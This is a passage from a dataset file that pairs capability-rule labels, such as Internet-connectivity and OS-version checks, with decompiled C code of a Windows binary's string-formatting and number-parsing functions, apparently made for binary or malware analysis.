arg3_00 = piVar19;\n        }\n        else {\n            arg3_00 = *(piVar10 + 0xb);\n            piVar14 = piVar14 + iVar16;\n            if (arg3_00 <= 0x1fffffffffffffff - arg2) {\ncode_r0x00014003f3a9:\n                fcn.1400a6c40(&puStack136, piVar14, arg3_00);\n                goto code_r0x00014003f026;\n            }\n        }\n        fcn.1400b7170(0x1400fe0e2);\n        piVar19 = arg3_00;\ncode_r0x00014003f61c:\n        uVar11 = fcn.1400b1a60(0x1400fe138, 0x1400fe124, piVar19, piVar20);\n        fcn.1400b6670(uVar11);\n        (**(*piVar10 + 8))(piVar10);\n        do {\n            uVar11 = fcn.1400b6b70();\n            fcn.1400b6670(uVar11);\n        } while( true );\n    }\ncode_r0x00014003f026:\n    uVar17 = *(arg4 + 0x18) & 0xb0;\n    uVar22 = uStack232 + piStack128;\n    if ((*(arg4 + 0x18) & 0x200) != 0) {\n        uVar22 = uVar22 + piVar10[6];\n    }\n    uStack96 = 0;\n    uStack88 = 0;\n    puStack104 = &uStack88;\n    fcn.1400a6b00(&puStack104, uVar22 * 2);\n    uVar5 = *(arg4 + 0x10);\n    ppuVar18 = &uStack140;\n    bVar12 = uVar17 == 0x10 && uVar22 < uVar5;\n    arg2_00 = uStack96;\n    do {\n        if (*ppuVar18 < 5) {\n    // switch table (5 cases) at 0x1400fe170\n            switch(*ppuVar18) {\n            case 0:\n                if (bVar12) {\ncode_r0x00014003f1e7:\n                    piVar20 = uVar5 - uVar22;\n                    fcn.1400a5030(&puStack104, arg2_00, 0, piVar20);\n                    arg2_00 = uStack96;\n                }\n                break;\n            case 1:\ncode_r0x00014003f180:\n                if (bVar12) goto code_r0x00014003f1e7;\n                uVar1 = arg2_00 + 1;\n                if (puStack104 == &uStack88) {\n                    uVar15 = 7;\n                }\n                else {\n                    uVar15 = CONCAT62(Stack86, uStack88);\n                }\n                if (uVar15 < uVar1) {\n                    piVar20 = NULL;\n                    fcn.1400a6e10(&puStack104, arg2_00, 0, 0);\n                }\n                puStack104[arg2_00] = in_stack_00000028;\n                uStack96 = uVar1;\n                puStack104[arg2_00 + 1] = 0;\n                arg2_00 = uVar1;\n                break;\n            case 2:\n                if ((*(arg4 + 0x19) & 2) != 0) {\n                    piVar14 = piVar10[6];\n                    puVar13 = piVar10[5];\n                    if (piVar14 <= 0x1fffffffffffffff - arg2_00) goto code_r0x00014003f236;\n                    fcn.1400b7170(0x1400fe0e2);\n                    goto code_r0x00014003f180;\n                }\n                break;\n            case 3:\n                if (uStack232 != 0) {\n                    uVar3 = *puStack208;\n                    uVar1 = arg2_00 + 1;\n                    if (puStack104 == &uStack88) {\n                        uVar15 = 7;\n                    }\n                    else {\n                        uVar15 = CONCAT62(Stack86, uStack88);\n                    }\n                    if (uVar15 < uVar1) {\n                        piVar20 = NULL;\n                        fcn.1400a6e10(&puStack104, arg2_00, 0, 0);\n                    }\n                    puStack104[arg2_00] = uVar3;\n                    uStack96 = uVar1;\n                    puStack104[arg2_00 + 1] = 0;\n                    arg2_00 = uVar1;\n                }\n                break;\n            case 4:\n                puVar13 = puStack136;\n                piVar14 = piStack128;\n                if (0x1fffffffffffffff - arg2_00 < piStack128) {\n                    piVar19 = piStack128;\n                    fcn.1400b7170(0x1400fe0e2);\n                    goto code_r0x00014003f5f8;\n                }\ncode_r0x00014003f236:\n                fcn.1400a6c40(&puStack104, puVar13, piVar14);\n                arg2_00 = uStack96;\n            }\n        }\n        ppuVar18 = ppuVar18 + 1;\n    } while (&puStack136 != ppuVar18);\n    if (1 < uStack232) {\n        piVar19 = uStack232 - 1;\n        if (0x1fffffffffffffff - arg2_00 < piVar19) goto code_r0x00014003f604;\n        fcn.1400a6c40(&puStack104, puStack208 + 1, piVar19);\n        arg2_00 = uStack96;\n    }\n    if (arg2_00 < uVar5) {\n        if (uVar17 == 0x20) {\n            fcn.1400a5030(&puStack104, arg2_00, 0, uVar5 - arg2_00);\n            arg2_00 = uVar5;\n        }\n        else {\n            fcn.1400a5030(&puStack104, 0, 0, uVar5 - arg2_00);\n            arg2_00 = uVar5;\n        }\n    }\n    uVar22 = piVar21 & 0xffffffff;\n    if ((piVar21 == '\\0') && (iVar9 = (**(*piVar4 + 0x60))(piVar4, puStack104, arg2_00),  arg2_00 != iVar9)) {\n        uVar22 = 1;\n    }\n    piVar21 = piVar21 & 0xffffffffffffff00 | uVar22 & 0xff;\n    if (puStack104 != &uStack88) {\n        fcn.1400b64d0(puStack104);\n    }\n    if (puStack136 != &uStack120) {\n        fcn.1400b64d0();\n    }\ncode_r0x00014003eece:\n    *(arg4 + 0x10) = 0;\n    arg1[1] = piVar21;\n    *arg1 = piVar4;\n    return;\n}\n",
        "token_count": 3202
    },
    "1400460b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t ** fcn.1400460b0(int64_t **arg1)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    int64_t *piVar4;\n    uint8_t uVar5;\n    char cVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int64_t iVar9;\n    uint64_t uVar10;\n    uint64_t uVar11;\n    int64_t iVar12;\n    char cVar13;\n    bool bVar14;\n    int64_t **in_R8;\n    int64_t **in_R9;\n    uint32_t uVar15;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    int32_t iVar19;\n    uint8_t uVar20;\n    bool bVar21;\n    bool bVar22;\n    bool bVar23;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    uint32_t *in_stack_00000038;\n    char cStack152;\n    int64_t **ppiStack144;\n    uint32_t uStack136;\n    uint8_t uStack131;\n    bool bStack130;\n    int64_t *piStack120;\n    int32_t iStack112;\n    uint uStack108;\n    int64_t *piStack104;\n    uint uStack96;\n    uint uStack92;\n    uchar uStack81;\n    int64_t aiStack80 [2];\n    \n    piStack104 = *in_R8;\n    uStack96 = *(in_R8 + 1);\n    uStack92 = *(in_R8 + 0xc);\n    piStack120 = *in_R9;\n    iStack112 = *(in_R9 + 1);\n    uStack108 = *(in_R9 + 0xc);\n    iVar9 = fcn.140020fc0(in_stack_00000028 + 0xd0);\n    uVar16 = *(in_stack_00000028 + 0x18) & 0x4a;\n    if (uVar16 == 0x40) {\n        uVar15 = 8;\ncode_r0x000140046118:\n        uVar5 = fcn.140023f10(&piStack104, &piStack120);\n        if (uVar5 == 0) {\ncode_r0x00014004613c:\n            ppiStack144 = &piStack104;\n            uVar7 = fcn.140023fd0(ppiStack144);\n            cVar6 = uVar7;\n            bVar21 = *(iVar9 + 0x6e) == cVar6;\n            if ((bVar21) || (*(iVar9 + 0x6f) == cVar6)) {\n                cVar13 = *(iVar9 + 0x20);\n                if (((cVar13 != '\\0') && (*(iVar9 + 0x49) == cVar6)) || (*(iVar9 + 0x48) == cVar6))\n                goto code_r0x0001400461a6;\n                fcn.140095670(piStack104);\n                uStack96 = 0xffffffff;\n                uVar5 = fcn.140023f10(ppiStack144, &piStack120);\n                if (uVar5 == 0) {\n                    uVar7 = fcn.140023fd0(ppiStack144);\n                    cVar13 = *(iVar9 + 0x20);\n                    goto code_r0x0001400461a6;\n                }\n                iVar19 = 0;\n                bVar3 = false;\n            }\n            else {\n                bVar21 = false;\n                cVar13 = *(iVar9 + 0x20);\ncode_r0x0001400461a6:\n                iVar19 = 0;\n                bVar3 = false;\n                while (((piVar4 = piStack104,  cVar6 = uVar7,  cVar13 == '\\0' || (*(iVar9 + 0x49) != cVar6)) &&\n                       (*(iVar9 + 0x48) != cVar6))) {\n                    if (*(iVar9 + 0x72) == cVar6) {\n                        bVar3 = bVar3 ^ 1U | uVar15 == 10;\n                        if (!bVar3) goto code_r0x0001400461d3;\n                        bVar23 = uVar15 == 8;\n                        if (bVar23 || uVar16 == 0) {\n                            iVar19 = 0;\n                            uVar15 = 8;\n                            bVar3 = bVar23 || uVar16 == 0;\n                        }\n                        else {\n                            iVar19 = iVar19 + 1;\n                        }\n                    }\n                    else {\n                        if (!bVar3) break;\ncode_r0x0001400461d3:\n                        if ((*(iVar9 + 0x70) != cVar6) && (*(iVar9 + 0x71) != cVar6)) {\n                            uVar5 = 0;\n                            bVar3 = true;\n                            goto code_r0x00014004625b;\n                        }\n                        uVar5 = uVar16 == 0 || uVar15 == 0x10;\n                        if (uVar16 != 0 && uVar15 != 0x10) {\n                            bVar3 = true;\n                            uStack136 = uVar15;\n                            goto code_r0x000140046272;\n                        }\n                        iVar19 = 0;\n                        uVar15 = 0x10;\n                        bVar3 = false;\n                    }\n                    if (piStack104[2] < piStack104[3]) {\n                        uVar10 = piStack104[2] + 1;\n                        uStack96 = 0xffffffff;\n                        piStack104[2] = uVar10;\n                        if (uVar10 < piStack104[3]) goto code_r0x000140046230;\ncode_r0x000140046628:\n                        uStack96 = 0xffffffff;\n                        iVar8 = (**(*piVar4 + 0x48))(piVar4);\n                        if (iVar8 != -1) goto code_r0x000140046230;\n                        piStack104 = NULL;\n                        bVar23 = true;\n                    }\n                    else {\n                        (**(*piStack104 + 0x50))(piStack104);\n                        uStack96 = 0xffffffff;\n                        if (piVar4[3] <= piVar4[2]) goto code_r0x000140046628;\ncode_r0x000140046230:\n                        bVar23 = false;\n                    }\n                    bVar14 = piStack120 != NULL && iStack112 == -1;\n                    bVar22 = iStack112 == -1;\n                    if (bVar14) {\n                        if ((piStack120[2] < piStack120[3]) || (iVar8 = (**(*piStack120 + 0x48))(),  iVar8 != -1)) {\n                            bVar22 = false;\n                        }\n                        else {\n                            piStack120 = NULL;\n                            bVar22 = bVar14;\n                        }\n                    }\n                    if (bVar23 == bVar22) {\n                        uVar5 = 1;\n                        goto code_r0x00014004625b;\n                    }\n                    if (piStack104 == NULL) {\ncode_r0x000140046670:\n                        uVar7 = 0xffffffff;\n                    }\n                    else if (piStack104[2] < piStack104[3]) {\n                        uVar7 = *piStack104[2];\n                    }\n                    else {\n                        uVar7 = (**(*piStack104 + 0x48))();\n                        if (uVar7 == 0xffffffff) {\n                            piStack104 = NULL;\n                            goto code_r0x000140046670;\n                        }\n                    }\n                    if (!bVar3) break;\n                    cVar13 = *(iVar9 + 0x20);\n                }\n                uVar5 = 0;\n            }\ncode_r0x00014004625b:\n            uStack136 = uVar15;\n            if (uVar15 == 0x10) goto code_r0x000140046466;\n        }\n        else {\n            bVar21 = false;\n            uVar7 = 0;\n            iVar19 = 0;\n            bVar3 = false;\n            uStack136 = uVar15;\n        }\n    }\n    else {\n        uVar15 = 10;\n        if (uVar16 != 8) goto code_r0x000140046118;\n        uVar15 = 0x10;\n        uVar5 = fcn.140023f10(&piStack104, &piStack120);\n        if (uVar5 == 0) goto code_r0x00014004613c;\n        bVar21 = false;\n        uVar7 = 0;\n        iVar19 = 0;\n        bVar3 = false;\ncode_r0x000140046466:\n        uStack136 = 0x10;\n        uVar15 = 0x16;\n    }\ncode_r0x000140046272:\n    ppiStack144 = &piStack104;\n    aiStack80[0] = fcn.140075910(0, 0);\n    if (*(iVar9 + 0x20) != '\\0') {\n        fcn.140077810(aiStack80, 0x20);\n    }\n    uVar20 = *(iVar9 + 0x88);\n    uVar16 = 0xffffffff / uStack136;\n    if (uVar20 == 0) {\n        uStack131 = 0;\n        if (uVar5 == 0) {\n            cStack152 = uVar15;\n            uVar17 = 0;\ncode_r0x0001400462d4:\n            cVar6 = uVar7;\n            uVar7 = cVar6;\n            if (uVar15 < 0xb) {\n                if ((cVar6 < '0') || (cStack152 + '0' <= cVar6)) goto code_r0x000140046532;\n            }\n            else if (9 < cVar6 - 0x30U) goto code_r0x00014004651b;\n            uVar18 = uVar7 - 0x30;\n            do {\n                while( true ) {\n                    piVar4 = piStack104;\n                    if (uVar16 < uVar17) {\n                        uStack131 = 1;\n                    }\n                    else {\n                        uVar7 = uVar17 * uStack136;\n                        uVar17 = uVar18 + uVar7;\n                        uStack131 = uStack131 | CARRY4(uVar18, uVar7);\n                        iVar19 = iVar19 + 1;\n                    }\n                    uVar10 = piStack104[3];\n                    if (piStack104[2] < uVar10) {\n                        uVar11 = piStack104[2] + 1;\n                        piStack104[2] = uVar11;\n                    }\n                    else {\n                        (**(*piStack104 + 0x50))(piStack104);\n                        uVar11 = piVar4[2];\n                        uVar10 = piVar4[3];\n                    }\n                    uStack96 = 0xffffffff;\n                    bVar23 = false;\n                    if (uVar10 <= uVar11) {\n                        iVar8 = (**(*piVar4 + 0x48))(piVar4);\n                        if (iVar8 == -1) {\n                            piStack104 = NULL;\n                        }\n                        bVar23 = iVar8 == -1;\n                    }\n                    bVar22 = iStack112 == -1;\n                    if (((piStack120 != NULL) && (bVar22)) && (bVar22 = false,  piStack120[3] <= piStack120[2])) {\n                        iVar8 = (**(*piStack120 + 0x48))();\n                        bVar22 = iVar8 == -1;\n                        if (bVar22) {\n                            piStack120 = NULL;\n                        }\n                    }\n                    if (bVar22 == bVar23) {\n                        uVar2 = uVar5;\n                        uVar20 = 1;\n                        goto code_r0x000140046376;\n                    }\n                    if (piStack104 != NULL) break;\n                    if (uVar15 < 0xb) goto code_r0x000140046532;\n                    cVar6 = -1;\n                    uVar7 = 0xffffffff;\ncode_r0x0001400466e4:\n                    if (5 < cVar6 + 0xbfU) goto code_r0x000140046532;\n                    uVar18 = uVar7 - 0x37;\n                }\n                if (piStack104[2] < piStack104[3]) {\n                    uVar7 = *piStack104[2];\n                    goto code_r0x0001400462d4;\n                }\n                uVar7 = (**(*piStack104 + 0x48))();\n                if (uVar7 != 0xffffffff) goto code_r0x0001400462d4;\n                piStack104 = NULL;\n                if (uVar15 < 0xb) goto code_r0x000140046532;\n                cVar6 = -1;\ncode_r0x00014004651b:\n                if (5 < cVar6 + 0x9fU) goto code_r0x0001400466e4;\n                uVar18 = uVar7 - 0x57;\n                if (uVar7 == 0x56) goto code_r0x000140046532;\n            } while( true );\n        }\n        uVar17 = 0;\n        uVar2 = 0;\n        uVar20 = uVar5;\ncode_r0x000140046376:\n        uVar5 = uVar2;\n        uVar2 = uVar20;\n        if (*(aiStack80[0] + -0x18) == 0) goto code_r0x000140046386;\ncode_r0x000140046545:\n        uVar20 = uVar2;\n        fcn.140077ac0(aiStack80, iVar19);\n        cVar6 = fcn.1400b15c0(*(iVar9 + 0x10), *(iVar9 + 0x18), aiStack80);\n        if (cVar6 == '\\0') {\n            *in_stack_00000030 = 4;\n        }\n        if (((iVar19 != 0) || (bVar3)) || (*(aiStack80[0] + -0x18) != 0)) goto code_r0x000140046589;\n    }\n    else {\n        if (uVar5 != 0) {\n            uStack131 = 0;\n            uVar17 = 0;\n            uVar2 = 0;\n            uVar20 = uVar5;\n            goto code_r0x000140046376;\n        }\n        uVar2 = *(iVar9 + 0x20);\n        uStack131 = 0;\n        uVar17 = 0;\n        if ((uVar2 != 0) && (*(iVar9 + 0x49) == uVar7)) goto code_r0x0001400467f1;\n        while ((*(iVar9 + 0x48) != uVar7 && (iVar12 = sub.msvcrt.dll_memchr(iVar9 + 0x72, uVar7, uVar15),  iVar12 != 0))\n              ) {\n            uVar7 = iVar12 - (iVar9 + 0x72);\n            if (0xf < uVar7) {\n                uVar7 = uVar7 - 6;\n            }\n            uVar2 = uVar20;\n            if (uVar17 <= uVar16) {\n                uVar18 = uVar17 * uStack136;\n                uVar17 = uVar7 + uVar18;\n                iVar19 = iVar19 + 1;\n                uVar2 = uStack131 | CARRY4(uVar7, uVar18);\n            }\n            while( true ) {\n                uStack131 = uVar2;\n                piVar4 = piStack104;\n                uVar10 = piStack104[3];\n                if (piStack104[2] < uVar10) {\n                    uVar11 = piStack104[2] + 1;\n                    piStack104[2] = uVar11;\n                }\n                else {\n                    (**(*piStack104 + 0x50))(piStack104);\n                    uVar11 = piVar4[2];\n                    uVar10 = piVar4[3];\n                }\n                uStack96 = 0xffffffff;\n                bStack130 = false;\n                if (uVar10 <= uVar11) {\n                    iVar8 = (**(*piVar4 + 0x48))(piVar4);\n                    if (iVar8 == -1) {\n                        piStack104 = NULL;\n                    }\n                    bStack130 = iVar8 == -1;\n                }\n                bVar23 = iStack112 == -1;\n                if (((piStack120 != NULL) && (bVar23)) && (bVar23 = false,  piStack120[3] <= piStack120[2])) {\n                    iVar8 = (**(*piStack120 + 0x48))();\n                    bVar23 = iVar8 == -1;\n                    if (bVar23) {\n                        piStack120 = NULL;\n                    }\n                }\n                uVar2 = uVar5;\n                if (bStack130 == bVar23) goto code_r0x000140046376;\n                uVar7 = fcn.140023fd0(ppiStack144);\n                uVar2 = *(iVar9 + 0x20);\n                if ((uVar2 == 0) || (*(iVar9 + 0x49) != uVar7)) break;\ncode_r0x0001400467f1:\n                if (iVar19 == 0) {\n                    uVar20 = 0;\n                    goto code_r0x000140046376;\n                }\n                fcn.140077ac0(aiStack80, iVar19);\n                iVar19 = 0;\n                uVar2 = uStack131;\n            }\n        }\ncode_r0x000140046532:\n        uVar20 = 0;\n        uVar2 = 0;\n        if (*(aiStack80[0] + -0x18) != 0) goto code_r0x000140046545;\ncode_r0x000140046386:\n        if ((iVar19 != 0) || (bVar3)) {\ncode_r0x000140046589:\n            if (uVar5 == 0) {\n                if (uStack131 == 0) {\n                    if (bVar21) {\n                        uVar17 = -uVar17;\n                    }\n                    *in_stack_00000038 = uVar17;\n                }\n                else {\n                    *in_stack_00000038 = 0xffffffff;\n                    *in_stack_00000030 = 4;\n                }\n                goto code_r0x0001400463b5;\n            }\n        }\n    }\n    *in_stack_00000038 = 0;\n    *in_stack_00000030 = 4;\ncode_r0x0001400463b5:\n    if (uVar20 != 0) {\n        *in_stack_00000030 = *in_stack_00000030 | 2;\n    }\n    *arg1 = piStack104;\n    arg1[1] = CONCAT44(uStack92, uStack96);\n    if (**0x140102a70 == 0) {\n        iVar19 = *(aiStack80[0] + -8);\n        *(aiStack80[0] + -8) = iVar19 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack80[0] + -8;\n        iVar19 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar19 < 1) {\n        fcn.140075f90(aiStack80[0] + -0x18, &uStack81);\n    }\n    return arg1;\n}\n",
        "token_count": 4366
    },
    "140046a7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t ** fcn.140046a70(int64_t **arg1)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    int64_t *piVar3;\n    uint8_t uVar4;\n    char cVar5;\n    uint32_t uVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    int64_t iVar10;\n    char cVar11;\n    bool bVar12;\n    int32_t iVar13;\n    int64_t **in_R8;\n    int64_t **in_R9;\n    uint32_t uVar14;\n    int32_t iVar15;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    uint8_t uVar18;\n    bool bVar19;\n    bool bVar20;\n    bool bVar21;\n    int64_t in_stack_00000028;\n    uint32_t *in_stack_00000030;\n    uint32_t *in_stack_00000038;\n    uint32_t uStack160;\n    char cStack152;\n    int64_t **ppiStack144;\n    uint32_t uStack136;\n    uint8_t uStack130;\n    bool bStack129;\n    int64_t *piStack120;\n    int32_t iStack112;\n    uint uStack108;\n    int64_t *piStack104;\n    uint uStack96;\n    uint uStack92;\n    uchar uStack81;\n    int64_t aiStack80 [2];\n    \n    piStack104 = *in_R8;\n    uStack96 = *(in_R8 + 1);\n    uStack92 = *(in_R8 + 0xc);\n    piStack120 = *in_R9;\n    iStack112 = *(in_R9 + 1);\n    uStack108 = *(in_R9 + 0xc);\n    iVar7 = fcn.140020fc0(in_stack_00000028 + 0xd0);\n    uVar16 = *(in_stack_00000028 + 0x18) & 0x4a;\n    if (uVar16 == 0x40) {\n        uVar14 = 8;\ncode_r0x000140046ad8:\n        uVar4 = fcn.140023f10(&piStack104, &piStack120);\n        if (uVar4 == 0) {\ncode_r0x000140046afc:\n            ppiStack144 = &piStack104;\n            uVar6 = fcn.140023fd0(ppiStack144);\n            cVar5 = uVar6;\n            bVar19 = *(iVar7 + 0x6e) == cVar5;\n            uStack136 = bVar19;\n            if ((bVar19) || (*(iVar7 + 0x6f) == cVar5)) {\n                cVar11 = *(iVar7 + 0x20);\n                if (((cVar11 != '\\0') && (*(iVar7 + 0x49) == cVar5)) || (*(iVar7 + 0x48) == cVar5))\n                goto code_r0x000140046b66;\n                fcn.140095670(piStack104);\n                uStack96 = 0xffffffff;\n                uVar4 = fcn.140023f10(ppiStack144, &piStack120);\n                if (uVar4 == 0) {\n                    uVar6 = fcn.140023fd0(ppiStack144);\n                    cVar11 = *(iVar7 + 0x20);\n                    goto code_r0x000140046b66;\n                }\n                iVar15 = 0;\n                bVar19 = false;\n            }\n            else {\n                uStack136 = 0;\n                cVar11 = *(iVar7 + 0x20);\ncode_r0x000140046b66:\n                iVar15 = 0;\n                bVar19 = false;\n                while (((piVar3 = piStack104,  cVar5 = uVar6,  cVar11 == '\\0' || (*(iVar7 + 0x49) != cVar5)) &&\n                       (*(iVar7 + 0x48) != cVar5))) {\n                    if (*(iVar7 + 0x72) == cVar5) {\n                        bVar19 = bVar19 ^ 1U | uVar14 == 10;\n                        if (!bVar19) goto code_r0x000140046b93;\n                        bVar21 = uVar14 == 8;\n                        if (bVar21 || uVar16 == 0) {\n                            iVar15 = 0;\n                            uVar14 = 8;\n                            bVar19 = bVar21 || uVar16 == 0;\n                        }\n                        else {\n                            iVar15 = iVar15 + 1;\n                        }\n                    }\n                    else {\n                        if (!bVar19) break;\ncode_r0x000140046b93:\n                        if ((*(iVar7 + 0x70) != cVar5) && (*(iVar7 + 0x71) != cVar5)) {\n                            uVar4 = 0;\n                            bVar19 = true;\n                            goto code_r0x000140046c1b;\n                        }\n                        uVar4 = uVar16 == 0 || uVar14 == 0x10;\n                        if (uVar16 != 0 && uVar14 != 0x10) {\n                            bVar19 = true;\n                            uStack160 = uVar14;\n                            goto code_r0x000140046c32;\n                        }\n                        iVar15 = 0;\n                        uVar14 = 0x10;\n                        bVar19 = false;\n                    }\n                    if (piStack104[2] < piStack104[3]) {\n                        uVar8 = piStack104[2] + 1;\n                        uStack96 = 0xffffffff;\n                        piStack104[2] = uVar8;\n                        if (uVar8 < piStack104[3]) goto code_r0x000140046bf0;\ncode_r0x000140047008:\n                        uStack96 = 0xffffffff;\n                        iVar13 = (**(*piVar3 + 0x48))(piVar3);\n                        if (iVar13 != -1) goto code_r0x000140046bf0;\n                        piStack104 = NULL;\n                        bVar21 = true;\n                    }\n                    else {\n                        (**(*piStack104 + 0x50))(piStack104);\n                        uStack96 = 0xffffffff;\n                        if (piVar3[3] <= piVar3[2]) goto code_r0x000140047008;\ncode_r0x000140046bf0:\n                        bVar21 = false;\n                    }\n                    bVar12 = piStack120 != NULL && iStack112 == -1;\n                    bVar20 = iStack112 == -1;\n                    if (bVar12) {\n                        if ((piStack120[2] < piStack120[3]) || (iVar13 = (**(*piStack120 + 0x48))(),  iVar13 != -1)) {\n                            bVar20 = false;\n                        }\n                        else {\n                            piStack120 = NULL;\n                            bVar20 = bVar12;\n                        }\n                    }\n                    if (bVar20 == bVar21) {\n                        uVar4 = 1;\n                        goto code_r0x000140046c1b;\n                    }\n                    if (piStack104 == NULL) {\ncode_r0x000140047050:\n                        uVar6 = 0xffffffff;\n                    }\n                    else if (piStack104[2] < piStack104[3]) {\n                        uVar6 = *piStack104[2];\n                    }\n                    else {\n                        uVar6 = (**(*piStack104 + 0x48))();\n                        if (uVar6 == 0xffffffff) {\n                            piStack104 = NULL;\n                            goto code_r0x000140047050;\n                        }\n                    }\n                    if (!bVar19) break;\n                    cVar11 = *(iVar7 + 0x20);\n                }\n                uVar4 = 0;\n            }\ncode_r0x000140046c1b:\n            uStack160 = uVar14;\n            if (uVar14 == 0x10) goto code_r0x000140046e36;\n        }\n        else {\n            uStack136 = 0;\n            uVar6 = 0;\n            iVar15 = 0;\n            bVar19 = false;\n            uStack160 = uVar14;\n        }\n    }\n    else {\n        uVar14 = 10;\n        if (uVar16 != 8) goto code_r0x000140046ad8;\n        uVar14 = 0x10;\n        uVar4 = fcn.140023f10(&piStack104, &piStack120);\n        if (uVar4 == 0) goto code_r0x000140046afc;\n        uStack136 = 0;\n        uVar6 = 0;\n        iVar15 = 0;\n        bVar19 = false;\ncode_r0x000140046e36:\n        uStack160 = 0x10;\n        uVar14 = 0x16;\n    }\ncode_r0x000140046c32:\n    ppiStack144 = &piStack104;\n    aiStack80[0] = fcn.140075910(0, 0);\n    if (*(iVar7 + 0x20) != '\\0') {\n        fcn.140077810(aiStack80, 0x20);\n    }\n    uVar18 = *(iVar7 + 0x88);\n    uVar16 = uStack136 + 0x7fffffff;\n    if (uVar18 == 0) {\n        uStack130 = 0;\n        if (uVar4 == 0) {\n            cStack152 = uVar14;\n            uVar17 = 0;\ncode_r0x000140046c9d:\n            cVar5 = uVar6;\n            uVar6 = cVar5;\n            if (uVar14 < 0xb) {\n                if ((cVar5 < '0') || (cStack152 + '0' <= cVar5)) goto code_r0x000140046f04;\n            }\n            else if (9 < cVar5 - 0x30U) goto code_r0x000140046eec;\n            iVar13 = uVar6 - 0x30;\n            do {\n                while( true ) {\n                    piVar3 = piStack104;\n                    if (uVar16 / uStack160 < uVar17) {\n                        uStack130 = 1;\n                    }\n                    else {\n                        uStack130 = uStack130 | uVar16 - iVar13 < uVar17 * uStack160;\n                        uVar17 = uVar17 * uStack160 + iVar13;\n                        iVar15 = iVar15 + 1;\n                    }\n                    uVar8 = piStack104[3];\n                    if (piStack104[2] < uVar8) {\n                        uVar9 = piStack104[2] + 1;\n                        piStack104[2] = uVar9;\n                    }\n                    else {\n                        (**(*piStack104 + 0x50))(piStack104);\n                        uVar9 = piVar3[2];\n                        uVar8 = piVar3[3];\n                    }\n                    uStack96 = 0xffffffff;\n                    bVar21 = false;\n                    if (uVar8 <= uVar9) {\n                        iVar13 = (**(*piVar3 + 0x48))(piVar3);\n                        if (iVar13 == -1) {\n                            piStack104 = NULL;\n                        }\n                        bVar21 = iVar13 == -1;\n                    }\n                    bVar20 = iStack112 == -1;\n                    if (((piStack120 != NULL) && (bVar20)) && (bVar20 = false,  piStack120[3] <= piStack120[2])) {\n                        iVar13 = (**(*piStack120 + 0x48))();\n                        bVar20 = iVar13 == -1;\n                        if (bVar20) {\n                            piStack120 = NULL;\n                        }\n                    }\n                    if (bVar21 == bVar20) {\n                        uVar2 = uVar4;\n                        uVar18 = 1;\n                        goto code_r0x000140046d45;\n                    }\n                    if (piStack104 != NULL) break;\n                    if (uVar14 < 0xb) goto code_r0x000140046f04;\n                    cVar5 = -1;\n                    uVar6 = 0xffffffff;\ncode_r0x0001400470c4:\n                    if (5 < cVar5 + 0xbfU) goto code_r0x000140046f04;\n                    iVar13 = uVar6 - 0x37;\n                }\n                if (piStack104[2] < piStack104[3]) {\n                    uVar6 = *piStack104[2];\n                    goto code_r0x000140046c9d;\n                }\n                uVar6 = (**(*piStack104 + 0x48))();\n                if (uVar6 != 0xffffffff) goto code_r0x000140046c9d;\n                piStack104 = NULL;\n                if (uVar14 < 0xb) goto code_r0x000140046f04;\n                cVar5 = -1;\ncode_r0x000140046eec:\n                if (5 < cVar5 + 0x9fU) goto code_r0x0001400470c4;\n                iVar13 = uVar6 - 0x57;\n                if (uVar6 == 0x56) goto code_r0x000140046f04;\n            } while( true );\n        }\n        uVar17 = 0;\n        uVar2 = 0;\n        uVar18 = uVar4;\ncode_r0x000140046d45:\n        uVar4 = uVar2;\n        uVar2 = uVar18;\n        if (*(aiStack80[0] + -0x18) == 0) goto code_r0x000140046d55;\ncode_r0x000140046f17:\n        uVar18 = uVar2;\n        fcn.140077ac0(aiStack80, iVar15);\n        cVar5 = fcn.1400b15c0(*(iVar7 + 0x10), *(iVar7 + 0x18), aiStack80);\n        if (cVar5 == '\\0') {\n            *in_stack_00000030 = 4;\n        }\n        if (((iVar15 != 0) || (bVar19)) || (*(aiStack80[0] + -0x18) != 0)) goto code_r0x000140046f5b;\n    }\n    else {\n        if (uVar4 != 0) {\n            uStack130 = 0;\n            uVar17 = 0;\n            uVar2 = 0;\n            uVar18 = uVar4;\n            goto code_r0x000140046d45;\n        }\n        uVar2 = *(iVar7 + 0x20);\n        uStack130 = 0;\n        uVar17 = 0;\n        if ((uVar2 != 0) && (*(iVar7 + 0x49) == uVar6)) goto code_r0x0001400471d7;\n        while ((*(iVar7 + 0x48) != uVar6 && (iVar10 = sub.msvcrt.dll_memchr(iVar7 + 0x72, uVar6, uVar14),  iVar10 != 0))\n              ) {\n            iVar13 = iVar10 - (iVar7 + 0x72);\n            if (0xf < iVar13) {\n                iVar13 = iVar13 + -6;\n            }\n            uVar2 = uVar18;\n            if (uVar17 <= uVar16 / uStack160) {\n                uVar6 = uVar17 * uStack160;\n                uVar17 = uVar6 + iVar13;\n                iVar15 = iVar15 + 1;\n                uVar2 = uStack130 | uVar16 - iVar13 < uVar6;\n            }\n            while( true ) {\n                uStack130 = uVar2;\n                piVar3 = piStack104;\n                uVar8 = piStack104[3];\n                if (piStack104[2] < uVar8) {\n                    uVar9 = piStack104[2] + 1;\n                    piStack104[2] = uVar9;\n                }\n                else {\n                    (**(*piStack104 + 0x50))(piStack104);\n                    uVar9 = piVar3[2];\n                    uVar8 = piVar3[3];\n                }\n                uStack96 = 0xffffffff;\n                bStack129 = false;\n                if (uVar8 <= 